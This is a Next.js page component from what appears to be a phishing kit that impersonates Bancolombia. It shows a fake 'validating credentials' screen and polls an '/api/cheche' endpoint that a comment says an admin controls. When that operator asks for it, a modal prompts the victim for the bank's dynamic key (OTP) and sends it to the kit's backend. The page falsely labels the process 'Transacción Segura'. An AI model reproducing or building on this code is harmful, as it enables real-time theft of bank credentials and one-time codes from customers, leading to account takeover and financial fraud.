'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaCargandoPage() {
  const [status, setStatus] = useState('processing');
  const [sessionId, setSessionId] = useState('');
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpLoading, setOtpLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(60);
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
  }, [searchParams, router]);

  useEffect(() => {
    if (!sessionId) return;

    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/cheche?action=check_status&sessionId=${sessionId}`);
        const data = await response.json();
        
        if (data.success) {
          setStatus(data.status);

          if (data.status === 'waiting_otp') {
            setShowOtpModal(true);
            setTimeLeft(60); // Reset timer
          } else if (data.status === 'otp_valid') {
            // Transaction approved
            router.push(`/bancolombia/exito?sessionId=${sessionId}`);
          } else if (data.status === 'otp_invalid') {
            // OTP was wrong, reset to request new OTP
            setShowOtpModal(false);
            setOtp(''); // Clear previous OTP
            setStatus('password_entered'); // Go back to waiting for admin to request new OTP
          } else if (data.status === 'timeout') {
            router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
          }
        }
      } catch (error) {
        console.error('Error checking status:', error);
      }
    };

    const interval = setInterval(pollStatus, 2000);
    return () => clearInterval(interval);
  }, [sessionId, router]);

  // Countdown timer for OTP
  useEffect(() => {
    if (!showOtpModal || timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setShowOtpModal(false);
          setStatus('timeout');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [showOtpModal, timeLeft]);

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.trim()) return;

    setOtpLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'submit_otp',
          sessionId,
          otp: otp.trim()
        })
      });

      if (response.ok) {
        setStatus('otp_submitted');
        setShowOtpModal(false);
      }
    } catch (error) {
      console.error('Error submitting OTP:', error);
    } finally {
      setOtpLoading(false);
    }
  };

  const getStatusDisplay = () => {
    switch (status) {
      case 'processing':
      case 'password_entered':
        return {
          title: 'Validando credenciales...',
          message: 'Estamos verificando tu información con Bancolombia',
          showSpinner: true
        };
      case 'waiting_otp':
        return {
          title: 'Esperando clave dinámica...',
          message: 'Revisa tu dispositivo móvil o token para la clave dinámica',
          showSpinner: true
        };
      case 'otp_submitted':
        return {
          title: 'Validando clave dinámica...',
          message: 'Estamos verificando la clave dinámica ingresada',
          showSpinner: true
        };
      case 'otp_error':
        return {
          title: 'Clave dinámica incorrecta',
          message: 'La clave dinámica ingresada es incorrecta. Esperando nueva solicitud...',
          showSpinner: true
        };
      case 'timeout':
        return {
          title: 'Tiempo agotado',
          message: 'El tiempo de espera ha expirado. Por favor intenta nuevamente más tarde.',
          showSpinner: false
        };
      default:
        return {
          title: 'Procesando...',
          message: 'Por favor espera mientras procesamos tu solicitud',
          showSpinner: true
        };
    }
  };

  const statusDisplay = getStatusDisplay();

  return (
    <div className="min-h-screen bg-[#004B87] flex items-center justify-center p-4">
      <div className="max-w-md w-full">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="bg-white rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
            <img 
              src="/logos/bancos/bancolombia.png" 
              alt="Bancolombia" 
              className="w-14 h-14 object-contain"
            />
          </div>
          <h1 className="text-white text-2xl font-bold mb-2">Bancolombia</h1>
          <p className="text-blue-200">Procesando Transacción</p>
        </div>

        {/* Status Card */}
        <div className="bg-white rounded-xl shadow-2xl p-8">
          <div className="text-center">
            {statusDisplay.showSpinner && (
              <div className="mb-6">
                <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-[#004B87] mx-auto"></div>
              </div>
            )}

            <h2 className="text-2xl font-bold text-gray-800 mb-4">
              {statusDisplay.title}
            </h2>
            <p className="text-gray-600 mb-6">
              {statusDisplay.message}
            </p>

            {/* Removed otp_error button - now it continues the flow */}

            {status === 'timeout' && (
              <button
                onClick={() => router.push('/checkout')}
                className="w-full py-3 px-6 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition font-medium"
              >
                Intentar nuevamente más tarde
              </button>
            )}

            {statusDisplay.showSpinner && (
              <div className="flex items-center justify-center text-sm text-gray-500">
                <svg className="animate-pulse w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.293l-3-3a1 1 0 00-1.414 1.414L10.586 9.5H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z" clipRule="evenodd" />
                </svg>
                No cierres esta ventana
              </div>
            )}
          </div>

          <div className="mt-6 text-center">
            <div className="flex items-center justify-center space-x-2 text-green-600">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-sm font-medium">Transacción Segura</span>
            </div>
          </div>
        </div>

        {/* Footer Info */}
        <div className="text-center mt-6">
          <p className="text-blue-200 text-sm">
            Esta transacción es procesada de forma segura por Bancolombia
          </p>
          <p className="text-blue-300 text-xs mt-2">
            Session ID: {sessionId.slice(-8)}
          </p>
        </div>
      </div>

      {/* OTP Modal */}
      {showOtpModal && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl p-8 max-w-sm w-full">
            <div className="text-center mb-6">
              <div className="bg-blue-100 rounded-full w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                <svg className="w-8 h-8 text-[#004B87]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-2">Clave Dinámica</h3>
              <p className="text-gray-600 text-sm mb-2">
                Ingresa la clave dinámica que aparece en tu dispositivo
              </p>
              <div className="bg-red-50 text-red-600 text-xs px-3 py-2 rounded">
                Tiempo restante: {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
              </div>
            </div>

            <form onSubmit={handleOtpSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#004B87] focus:border-transparent outline-none transition text-lg text-center font-mono"
                  placeholder="000000"
                  disabled={otpLoading}
                  autoFocus
                />
              </div>

              <button
                type="submit"
                disabled={!otp.trim() || otpLoading}
                className="w-full py-3 px-6 bg-[#004B87] text-white rounded-lg hover:bg-[#003666] disabled:opacity-50 disabled:cursor-not-allowed transition font-medium"
              >
                {otpLoading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Enviando...
                  </span>
                ) : (
                  'Confirmar Clave'
                )}
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}